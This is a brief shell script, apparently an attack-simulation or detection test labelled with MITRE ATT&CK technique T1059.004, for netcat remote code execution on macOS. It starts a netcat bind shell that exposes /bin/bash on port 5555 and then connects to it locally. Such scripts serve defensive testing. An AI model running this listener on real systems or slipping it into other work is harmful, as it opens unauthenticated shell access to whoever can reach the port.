#!/usr/bin/env sh
# ATTACK_EXECUTION_T1059.004_MACOS_NETCAT_REMOTE_CODE_EXECUTION

bash -c "nc -n -l -v -p 5555 -e /bin/bash"
bash -c "nc localhost 5555"
